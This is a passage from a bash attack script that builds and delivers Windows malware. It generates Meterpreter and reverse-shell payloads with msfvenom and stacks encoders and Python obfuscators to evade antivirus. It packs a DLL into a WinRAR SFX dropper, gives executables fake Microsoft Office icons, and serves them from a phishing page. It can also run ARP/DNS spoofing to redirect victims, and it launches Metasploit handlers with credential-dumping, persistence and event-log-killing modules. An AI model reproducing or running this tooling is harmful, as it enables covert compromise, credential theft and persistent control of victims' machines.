      sleep 2


   else


      # user settings
      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    cp persistence2.rc persistence2[bak].rc
    sed -i "s|N4m|$N4m.dll|g" persistence2.rc
    sed -i "s|IPATH|$IPATH|g" persistence2.rc
    sed "s|M1P|$M1P|g" persistence2.rc > persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi




        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# -------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# and build trigger.bat to use in winrar/sfx
# 'make payload executable by pressing on it'
# -------------------------------------------------
sh_shellcode3 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ DLL NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> dll format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : DLL -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
# new obfuscating method
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/countdown -i 7 -f raw | msfvenom --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom --platform windows -e x86/shikata_ga_nai -i 7 -f dll > $IPATH/output/$N4m.dll"
echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


echo "[☠] Injecting shellcode -> $N4m.dll!"
sleep 2
# build winrar-SFX trigger.bat script
echo "[☠] Building winrar/SFX -> trigger.bat..."
sleep 2
echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
echo ":: this script will run payload using rundll32" >> $IPATH/output/trigger.bat
echo ":: ---" >> $IPATH/output/trigger.bat
echo "@echo off" >> $IPATH/output/trigger.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/trigger.bat
echo "rundll32.exe $N4m.dll,main" >> $IPATH/output/trigger.bat
echo "exit" >> $IPATH/output/trigger.bat
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.dll\n$IPATH/output/trigger.bat\n\nExecute on cmd: rundll32.exe $N4m.dll,main\n\nchose how to deliver: $N4m.dll" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log;  use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    cp persistence2.rc persistence2[bak].rc
    sed -i "s|N4m|$N4m.dll|g" persistence2.rc
    sed -i "s|IPATH|$IPATH|g" persistence2.rc
    sed "s|M1P|$M1P|g" persistence2.rc > persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH


  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
clear
}





# -------------------------------------------------------------
# build shellcode in PYTHON/EXE format (windows)
# 1º option: build default shellcode (my-way)
# 2º veil-evasion python -> pyherion (reproduction)
# 3º use pyinstaller by:david cortesi to compile python-to-exe
# 4º use NXcrypt to insert junk into sourcecode (obfuscation)
# -------------------------------------------------------------
sh_shellcode4 () {
# get user input to build shellcode (python)
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> C format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : C -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists (exec.py)
   if [ -e $InJEc2 ]; then
      echo "[☠] exec.py -> found!"
      sleep 2
   else
      echo "[☠] exec.py -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
cp $InJEc2 $IPATH/templates/exec[bak].py


   # edit exec.py using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc2 > /dev/null 2>&1
   else
      gedit $InJEc2 > /dev/null 2>&1
   fi

# move 'compiled' shellcode to output folder
mv $IPATH/templates/exec.py $IPATH/output/$N4m.py
chmod +x $IPATH/output/$N4m.py



# -----------------------------------------
# chose what to do with generated shellcode
# -----------------------------------------
ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to do with: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "default ($N4m.py) python" FALSE "pyherion ($N4m.py) obfuscated" FALSE "NXcrypt ($N4m.py) obfuscated" FALSE "pyinstaller ($N4m.exe) executable" --width 340 --height 240) > /dev/null 2>&1


   if [ "$ans" "=" "default ($N4m.py) python" ]; then
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       fi



     # CLEANING EVERYTHING UP
     echo "[☠] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   elif [ "$ans" "=" "pyherion ($N4m.py) obfuscated" ]; then
     cd $IPATH/obfuscate
     # obfuscating payload (pyherion.py)
     echo "[☠] pyherion -> encrypting..."
     sleep 2
     echo "[☠] base64+AES encoded -> $N4m.py!"
     sleep 2
     sudo ./pyherion.py $IPATH/output/$N4m.py $IPATH/output/$N4m.py > /dev/null 2>&1
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       fi

     # CLEANING EVERYTHING UP
     echo "[☠] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   elif [ "$ans" "=" "NXcrypt ($N4m.py) obfuscated" ]; then
     echo "[☠] NXcrypt -> found .."
     sleep 2
     echo "[☠] obfuscating -> $N4m.py!"
     sleep 2
     # use NXcrypt to obfuscate sourcecode
     cd $IPATH/obfuscate/
     xterm -T " NXcrypt obfuscator " -geometry 130x26 -e "sudo ./NXcrypt.py --file=$IPATH/output/$N4m.py --output=$IPATH/output/output_file.py"
     rm $IPATH/output/$N4m.py > /dev/null 2>&1
     mv $IPATH/output/output_file.py $IPATH/output/$N4m.py
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         cd $IPATH/
       fi

     # CLEANING EVERYTHING UP
     echo "[☠] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   else


     # check if pyinstaller its installed
     if [ -d $DrIvC/$PiWiN ]; then
       # compile python to exe
       echo "[☠] pyinstaller -> found!"
       sleep 2
       echo "[☠] compile $N4m.py -> $N4m.exe"
       sleep 2
       cd $IPATH/output

# chose executable final icon (.ico)
iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to use:" --radiolist --column "Pick" --column "Option" TRUE "Windows-Store.ico" FALSE "Windows-Logo.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" --width 320 --height 240) > /dev/null 2>&1

       #
       # TODO: check if executes on windows systems
       #
       xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/$N4m.py'"
       cp $IPATH/output/dist/$N4m.exe $IPATH/output/$N4m.exe
       rm $IPATH/output/*.spec > /dev/null 2>&1
       rm $IPATH/output/*.log > /dev/null 2>&1
       rm -r $IPATH/output/dist > /dev/null 2>&1
       rm -r $IPATH/output/build > /dev/null 2>&1
       zenity --title=" PYINSTALLER " --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.exe" --info > /dev/null 2>&1
       echo ""
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
